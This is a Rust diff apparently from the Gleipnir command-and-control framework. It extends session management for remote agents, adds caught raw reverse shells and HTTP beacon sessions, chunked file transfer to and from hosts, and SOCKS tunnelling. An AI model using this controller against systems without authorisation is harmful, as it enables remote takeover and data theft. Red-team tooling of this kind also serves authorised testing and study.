@@ -14,11 +14,12 @@ use tracing::{debug, info, warn};
 
 use crate::protocol::{Frame, FrameType, GleipnirCodec};
 use crate::socks::SocksConnection;
+use crate::ws::{EventBus, SessionEvent};
 
 pub enum BoxedStream {
     Tcp(TcpStream),
     #[cfg(feature = "tls")]
-    Tls(tokio_rustls::server::TlsStream<TcpStream>),
+    Tls(Box<tokio_rustls::server::TlsStream<TcpStream>>),
 }
 
 impl AsyncRead for BoxedStream {
@@ -65,7 +66,7 @@ impl AsyncWrite for BoxedStream {
     }
 }
 
-#[derive(Debug, Clone, Serialize)]
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct SessionInfo {
     pub name: String,
     pub os: String,
@@ -75,7 +76,8 @@ pub struct SessionInfo {
     pub pid: u32,
     pub cwd: String,
     pub connected: bool,
-    #[serde(skip)]
+    pub mode: String,
+    #[serde(skip, default = "Instant::now")]
     pub last_seen: Instant,
 }
 
@@ -109,15 +111,20 @@ pub enum SessionCommand {
     SendFrame(Frame),
 }
 
-struct ActiveSession {
-    info: SessionInfo,
-    cmd_tx: mpsc::Sender<SessionCommand>,
-    socks_connections: Arc<Mutex<HashMap<u32, SocksConnection>>>,
+pub(crate) struct ActiveSession {
+    pub(crate) info: SessionInfo,
+    pub(crate) cmd_tx: mpsc::Sender<SessionCommand>,
+    pub(crate) socks_connections: Arc<Mutex<HashMap<u32, SocksConnection>>>,
 }
+
+type HttpPendingMap = Arc<Mutex<HashMap<(String, u32), oneshot::Sender<Result<Vec<u8>, String>>>>>;
 
 pub struct SessionManager {
     sessions: Arc<Mutex<HashMap<String, ActiveSession>>>,
     next_id: Arc<Mutex<u32>>,
+    event_bus: Option<Arc<EventBus>>,
+    http_pending: HttpPendingMap,
+    http_next_task_id: Arc<Mutex<u32>>,
 }
 
 impl SessionManager {
@@ -125,7 +132,92 @@ impl SessionManager {
         Self {
             sessions: Arc::new(Mutex::new(HashMap::new())),
             next_id: Arc::new(Mutex::new(1)),
+            event_bus: None,
+            http_pending: Arc::new(Mutex::new(HashMap::new())),
+            http_next_task_id: Arc::new(Mutex::new(1)),
         }
+    }
+
+    pub fn with_event_bus(mut self, bus: Arc<EventBus>) -> Self {
+        self.event_bus = Some(bus);
+        self
+    }
+
+    fn emit(&self, event: SessionEvent) {
+        if let Some(ref bus) = self.event_bus {
+            bus.emit(event);
+        }
+    }
+
+    pub fn sessions_ref(&self) -> &Arc<Mutex<HashMap<String, ActiveSession>>> {
+        &self.sessions
+    }
+
+    pub async fn handle_raw_connection(
+        &self,
+        mut stream: TcpStream,
+        peer: std::net::SocketAddr,
+        name_prefix: String,
+    ) {
+        info!("new raw TCP connection from {peer}");
+
+        let shell_info = crate::session_raw::probe_and_upgrade(&mut stream).await;
+
+        let base = if name_prefix.is_empty() {
+            shell_info.hostname.to_lowercase()
+        } else {
+            format!("{}-{}", name_prefix, shell_info.hostname).to_lowercase()
+        };
+        let name = self.generate_name_base(&base).await;
+
+        info!(
+            "raw session '{name}' registered: {}@{} (uid={})",
+            shell_info.username, shell_info.hostname, shell_info.uid
+        );
+
+        let (cmd_tx, cmd_rx) = mpsc::channel::<SessionCommand>(32);
+
+        let session_info = SessionInfo {
+            name: name.clone(),
+            os: if shell_info.windows {
+                "windows"
+            } else {
+                "unknown"
+            }
+            .to_string(),
+            arch: "unknown".to_string(),
+            hostname: shell_info.hostname,
+            username: shell_info.username,
+            pid: 0,
+            cwd: String::new(),
+            connected: true,
+            mode: "raw".to_string(),
+            last_seen: Instant::now(),
+        };
+
+        {
+            let mut sessions = self.sessions.lock().await;
+            sessions.insert(
+                name.clone(),
+                ActiveSession {
+                    info: session_info,
+                    cmd_tx,
+                    socks_connections: Arc::new(Mutex::new(HashMap::new())),
+                },
+            );
+        }
+
+        self.emit(SessionEvent::new_session(&name, "raw", &format!("{peer}")));
+        crate::session_raw::raw_session_loop(stream, cmd_rx, shell_info.windows).await;
+
+        {
+            let mut sessions = self.sessions.lock().await;
+            if let Some(s) = sessions.get_mut(&name) {
+                s.info.connected = false;
+            }
+        }
+        self.emit(SessionEvent::session_closed(&name, "disconnected"));
+        info!("raw session '{name}' disconnected");
     }
 
     pub async fn handle_connection(&self, stream: BoxedStream, peer: std::net::SocketAddr) {
@@ -168,8 +260,10 @@ impl SessionManager {
             let mut sessions = self.sessions.lock().await;
             if let Some(existing) = sessions.get_mut(&name) {
                 if existing.info.connected {
-                    info!("session '{name}' takeover: disconnecting old connection");
-                    // Drop the old cmd_tx, which will cause the old session_loop to exit
+                    let age = existing.info.last_seen.elapsed();
+                    warn!(
+                        "session '{name}' takeover: disconnecting old connection (last seen {age:.1?} ago)"
+                    );
                     let (new_tx, _) = mpsc::channel::<SessionCommand>(32);
                     existing.cmd_tx = new_tx;
                 }
@@ -206,6 +300,7 @@ impl SessionManager {
             pid: platform.pid,
             cwd: platform.cwd,
             connected: true,
+            mode: "agent".to_string(),
             last_seen: Instant::now(),
         };
 
@@ -221,6 +316,11 @@ impl SessionManager {
             );
         }
 
+        self.emit(SessionEvent::new_session(
+            &name,
+            "agent",
+            &format!("{peer}"),
+        ));
         self.session_loop(&name, framed, cmd_rx, socks_connections)
             .await;
 
@@ -230,6 +330,7 @@ impl SessionManager {
                 s.info.connected = false;
             }
         }
+        self.emit(SessionEvent::session_closed(&name, "disconnected"));
         info!("session '{name}' disconnected");
     }
 
@@ -249,6 +350,8 @@ impl SessionManager {
 
         // Pending response waiters keyed by request_id
         let mut pending: HashMap<u32, oneshot::Sender<Result<Vec<u8>, String>>> = HashMap::new();
+        // Accumulator for chunked file downloads from agent
+        let mut chunked_downloads: HashMap<u32, Vec<u8>> = HashMap::new();
         let (timeout_tx, mut timeout_rx) = mpsc::channel::<u32>(64);
         let mut heartbeat = tokio::time::interval(std::time::Duration::from_secs(5));
         heartbeat.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
@@ -291,16 +394,56 @@ impl SessionManager {
                         }
                         SessionCommand::FileUp { data, remote_path, reply } => {
                             let rid = request_counter;
-                            let mut payload = BytesMut::new();
+                            const CHUNK_SIZE: usize = 1024 * 1024; // 1MB
+
+                            // First frame always carries the path header
                             let path_bytes = remote_path.as_bytes();
-                            payload.extend_from_slice(&(path_bytes.len() as u32).to_be_bytes());
-                            payload.extend_from_slice(path_bytes);
-                            payload.extend_from_slice(&data);
-                            let frame = Frame::new(FrameType::FileUp, rid, payload);
-                            if framed.send(frame).await.is_err() {
-                                let _ = reply.send(Err("send failed".into()));
-                                break;
+                            let mut header = BytesMut::new();
+                            header.extend_from_slice(&(path_bytes.len() as u32).to_be_bytes());
+                            header.extend_from_slice(path_bytes);
+
+                            if data.len() <= CHUNK_SIZE {
+                                // Small file: FileUp + FileEnd
+                                header.extend_from_slice(&data);
+                                let frame = Frame::new(FrameType::FileUp, rid, header);
+                                if framed.send(frame).await.is_err() {
+                                    let _ = reply.send(Err("send failed".into()));
+                                    break;
+                                }
+                                let end_frame = Frame::new(FrameType::FileEnd, rid, BytesMut::new());
+                                if framed.send(end_frame).await.is_err() {
+                                    let _ = reply.send(Err("send failed".into()));
+                                    break;
+                                }
+                            } else {
+                                // Large file: FileUp (path + first chunk), FileChunk*, FileEnd
+                                let first_chunk = &data[..CHUNK_SIZE.min(data.len())];
+                                header.extend_from_slice(first_chunk);
+                                let frame = Frame::new(FrameType::FileUp, rid, header);
+                                if framed.send(frame).await.is_err() {
+                                    let _ = reply.send(Err("send failed".into()));
+                                    break;
+                                }
+
+                                let mut offset = CHUNK_SIZE;
+                                let mut send_ok = true;
+                                while offset < data.len() && send_ok {
+                                    let end = (offset + CHUNK_SIZE).min(data.len());
+                                    let chunk = &data[offset..end];
+                                    let frame = Frame::new(FrameType::FileChunk, rid, BytesMut::from(chunk));
+                                    send_ok = framed.send(frame).await.is_ok();
+                                    offset = end;
+                                }
+                                if send_ok {
+                                    let frame = Frame::new(FrameType::FileEnd, rid, BytesMut::new());
+                                    send_ok = framed.send(frame).await.is_ok();
+                                }
+                                if !send_ok {
+                                    let _ = reply.send(Err("send failed".into()));
+                                    break;
+                                }
                             }
+
                             // Wrap the reply to convert Vec<u8> -> ()
                             let (inner_tx, inner_rx) = oneshot::channel();
                             pending.insert(rid, inner_tx);
@@ -357,12 +500,28 @@ impl SessionManager {
                                     }
                                 }
 
+                                FrameType::FileChunk => {
+                                    chunked_downloads
+                                        .entry(frame.request_id)
+                                        .or_default()
+                                        .extend_from_slice(&frame.payload);
+                                }
+
+                                FrameType::FileEnd => {
+                                    if let Some(data) = chunked_downloads.remove(&frame.request_id)
+                                        && let Some(reply) = pending.remove(&frame.request_id)
+                                    {
+                                        let _ = reply.send(Ok(data));
+                                    }
+                                }
+
                                 FrameType::Error => {
                                     if let Some(reply) = pending.remove(&frame.request_id) {
                                         let msg = frame.payload_as_str()
                                             .unwrap_or("unknown error").to_string();
                                         let _ = reply.send(Err(msg));
                                     }
+                                    chunked_downloads.remove(&frame.request_id);
                                 }
 
                                 // SOCKS frames from agent: route to the right client
@@ -387,7 +546,7 @@ impl SessionManager {
                                             .and_then(|c| c.connect_ack.take())
                                     };
                                     if let Some(tx) = ack_tx {
-                                        let ok = frame.payload_as_str().map_or(false, |s| s == "ok");
+                                        let ok = frame.payload_as_str() == Some("ok");
                                         let _ = tx.send(ok);
                                     }
                                     debug!("socks open ack for {}", frame.request_id);
@@ -419,8 +578,12 @@ impl SessionManager {
     }
 
     async fn generate_name(&self, platform: &PlatformInfo) -> String {
+        self.generate_name_base(&platform.hostname).await
+    }
+
+    async fn generate_name_base(&self, hostname: &str) -> String {
         let sessions = self.sessions.lock().await;
-        let base = platform.hostname.to_lowercase();
+        let base = hostname.to_lowercase();
         if !sessions.contains_key(&base) {
             return base;
         }
@@ -487,13 +650,6 @@ impl SessionManager {
             .map_err(|_| "session dropped reply".to_string())?
     }
 
-    pub async fn send_frame(&self, session: &str, frame: Frame) -> Result<(), String> {
-        let tx = self.get_tx(session).await?;
-        tx.send(SessionCommand::SendFrame(frame))
-            .await
-            .map_err(|_| "session channel closed".to_string())
-    }
-
     pub async fn get_socks_connections(
         &self,
         session: &str,
@@ -515,6 +671,28 @@ impl SessionManager {
         sessions.get(name).map(|s| s.info.clone())
     }
 
+    pub async fn kill_session(&self, name: &str) -> Result<(), String> {
+        let mut sessions = self.sessions.lock().await;
+        match sessions.remove(name) {
+            Some(_) => Ok(()),
+            None => Err(format!("session '{name}' not found")),
+        }
+    }
+
+    pub async fn rename_session(&self, old: &str, new: &str) -> Result<SessionInfo, String> {
+        let mut sessions = self.sessions.lock().await;
+        if sessions.contains_key(new) {
+            return Err(format!("session '{new}' already exists"));
+        }
+        let mut active = sessions
+            .remove(old)
+            .ok_or_else(|| format!("session '{old}' not found"))?;
+        active.info.name = new.to_string();
+        let info = active.info.clone();
+        sessions.insert(new.to_string(), active);
+        Ok(info)
+    }
+
     pub async fn get_frame_sender(&self, session: &str) -> Result<mpsc::Sender<Frame>, String> {
         let tx = self.get_tx(session).await?;
         let (frame_tx, mut frame_rx) = mpsc::channel::<Frame>(256);
@@ -526,6 +704,75 @@ impl SessionManager {
             }
         });
         Ok(frame_tx)
+    }
+
+    pub async fn register_http_session(
+        &self,
+        platform: PlatformInfo,
+    ) -> Result<(String, mpsc::Receiver<SessionCommand>), String> {
+        let name = if let Some(ref sid) = platform.session_id {
+            sid.clone()
+        } else {
+            self.generate_name(&platform).await
+        };
+
+        let (cmd_tx, cmd_rx) = mpsc::channel::<SessionCommand>(32);
+
+        let session_info = SessionInfo {
+            name: name.clone(),
+            os: platform.os,
+            arch: platform.arch,
+            hostname: platform.hostname,
+            username: platform.username,
+            pid: platform.pid,
+            cwd: platform.cwd,
+            connected: true,
+            mode: "http".to_string(),
+            last_seen: Instant::now(),
+        };
+
+        {
+            let mut sessions = self.sessions.lock().await;
+            sessions.insert(
+                name.clone(),
+                ActiveSession {
+                    info: session_info,
+                    cmd_tx,
+                    socks_connections: Arc::new(Mutex::new(HashMap::new())),
+                },
+            );
+        }
+
+        self.emit(SessionEvent::new_session(&name, "http", "http-beacon"));
+        Ok((name, cmd_rx))
+    }
+
+    pub async fn store_http_pending(
+        &self,
+        session: &str,
+        reply: oneshot::Sender<Result<Vec<u8>, String>>,
+    ) -> u32 {
+        let mut id = self.http_next_task_id.lock().await;
+        let task_id = *id;
+        *id = id.wrapping_add(1);
+        drop(id);
+
+        self.http_pending
+            .lock()
+            .await
+            .insert((session.to_string(), task_id), reply);
+        task_id
+    }
+
+    pub async fn take_http_pending(
+        &self,
+        session: &str,
+        task_id: u32,
+    ) -> Option<oneshot::Sender<Result<Vec<u8>, String>>> {
+        self.http_pending
+            .lock()
+            .await
+            .remove(&(session.to_string(), task_id))
     }
 
     async fn get_tx(&self, session: &str) -> Result<mpsc::Sender<SessionCommand>, String> {
